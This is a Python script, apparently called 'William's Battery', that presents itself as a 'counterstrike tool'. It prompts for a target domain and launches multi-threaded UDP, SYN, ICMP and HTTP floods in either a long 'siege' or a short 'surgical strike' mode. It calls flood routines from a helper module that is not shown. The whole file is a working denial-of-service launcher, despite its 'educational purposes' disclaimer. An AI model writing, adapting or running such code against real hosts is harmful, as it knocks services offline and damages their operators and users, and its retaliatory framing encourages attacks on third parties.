""""MIT License

Copyright (c) [2025] [Scott Wang]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE."""


import threading
import counter_strike_helper


def full_scale_counter_strike(target):
    """
    Launches a MASSIVE, PROLONGED, blended, multi-threaded counter-attack.
    This is a siege designed to run for a long time.
    """
    print("=" * 60)
    print("MODE: FULL SCALE COUNTER-STRIKE (SIEGE)")
    print("This will launch hundreds of attack threads for a long duration.")
    print("=" * 60)

    attack_threads = []

    # --- Parameters for a long-running siege ---
    udp_attacks = [("UDP-Mix", 53, 360), ("UDP-Mix", 443, 360), ("UDP-Mix", 123, 360)]
    syn_ports = [80, 443, 25, 587, 465, 143, 993, 22, 3389, 3306, 5432, 1433]
    syn_packet_count = 200000
    icmp_packet_count = 200000
    http_ports = [80, 443, 8080, 8000, 8443]
    http_request_count = 50000

    # --- Create and Launch Threads (Logic is the same, parameters differ) ---
    print("[*] Preparing UDP flood threads (Duration: 360s)...")
    for method, port, duration in udp_attacks:
        thread = threading.Thread(target=counter_strike_helper.attack_UDP, args=(method, target, port, duration))
        attack_threads.append(thread)
    # The 0-1024 scan is unique to the full-scale attack
    for i in range(0, 1025):
        thread = threading.Thread(target=counter_strike_helper.attack_UDP, args=("UDP-Mix", target, i, 360))
        attack_threads.append(thread)

    print("[*] Preparing SYN flood threads...")
    for port in syn_ports:
        thread = threading.Thread(target=counter_strike_helper.synflood, args=(target, port, syn_packet_count))
        attack_threads.append(thread)

    print("[*] Preparing ICMP flood thread...")
    thread = threading.Thread(target=counter_strike_helper.icmpflood, args=(target, icmp_packet_count))
    attack_threads.append(thread)

    print("[*] Preparing HTTP flood threads...")
    for port in http_ports:
        thread = threading.Thread(target=counter_strike_helper.attack_http_flood,
                                  args=(target, port, http_request_count))
        attack_threads.append(thread)

    launch_and_wait(attack_threads)


def fast_scale_counter_strike(target):
    """
    Launches a FAST, INTENSE, blended, multi-threaded counter-attack.
    This is a surgical strike designed for maximum impact in a short time.
    """
    print("=" * 60)
    print("MODE: FAST COUNTER-STRIKE (SURGICAL STRIKE)")
    print("This will launch a focused, high-intensity attack for a short duration.")
    print("=" * 60)

    attack_threads = []

    # --- Parameters for a short, high-impact burst ---
    udp_duration = 60  # Attack for 60 seconds
    syn_packet_count = 75000
    icmp_packet_count = 75000
    http_request_count = 25000

    # Focus on the most critical services
    udp_attacks = [("UDP-Mix", 53, udp_duration), ("UDP-Mix", 443, udp_duration)]
    syn_ports = [80, 443, 22, 3389]  # Web, SSH, RDP
    http_ports = [80, 443, 8080]  # Standard Web Ports

    # --- Create Threads for Each Focused Attack ---
    print(f"[*] Preparing UDP flood threads (Duration: {udp_duration}s)...")
    for method, port, duration in udp_attacks:
        thread = threading.Thread(target=counter_strike_helper.attack_UDP, args=(method, target, port, duration))
        attack_threads.append(thread)

    print("[*] Preparing SYN flood threads on critical ports...")
    for port in syn_ports:
        thread = threading.Thread(target=counter_strike_helper.synflood, args=(target, port, syn_packet_count))
        attack_threads.append(thread)

    print("[*] Preparing ICMP flood thread...")
    thread = threading.Thread(target=counter_strike_helper.icmpflood, args=(target, icmp_packet_count))
    attack_threads.append(thread)

    print("[*] Preparing HTTP flood threads on critical ports...")
    for port in http_ports:
        thread = threading.Thread(target=counter_strike_helper.attack_http_flood,
                                  args=(target, port, http_request_count))
        attack_threads.append(thread)

    launch_and_wait(attack_threads)


def launch_and_wait(attack_threads):
    """
    Helper function to launch and manage a list of attack threads.
    This avoids code repetition.
    """
    print("\n[+] All attack vectors prepared. Launching blended attack now!")
    print(f"[i] Total threads to launch: {len(attack_threads)}")

    # Start all the threads
    for thread in attack_threads:
        thread.daemon = True
        thread.start()

    # Wait for all threads to complete
    try:
        print("[i] Attack is running. Press Ctrl+C to attempt an early stop.")
        # The .join() here will block the main script until the thread finishes.
        for thread in attack_threads:
            thread.join()
        print("\n[+] All attack threads have completed their tasks.")
    except KeyboardInterrupt:
        print("\n[!] Keyboard interrupt received. The script will now exit.")
        # Daemon threads will be terminated automatically.


# --- Main Execution Block ---
if __name__ == "__main__":
    print("-" * 60)
    print("WELCOME TO WILLIAM'S BATTERY ---- A CONVENIENT COUNTERSTRIKE TOOL")
    print("-" * 60)
    print("This tool is for educational purposes ONLY. Use responsibly and legally.")
    target_domain = str(input("Please Enter The Domain Name Of Your Target: "))
    print(f"Target: {target_domain}")

    try:
        options_text = """
Select an attack profile:
  1: Full Scale Counterstrike (Long-running siege, all vectors)
  2: Fast Counterstrike (Short, intense, focused attack)

Please enter your option: """
        options = int(input(options_text))

        if options == 1:
            full_scale_counter_strike(target_domain)
        elif options == 2:
            fast_scale_counter_strike(target_domain)
        else:
            print("Invalid option selected. Exiting.")

    except ValueError:
        print("Invalid input. Please enter a number (1 or 2).")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")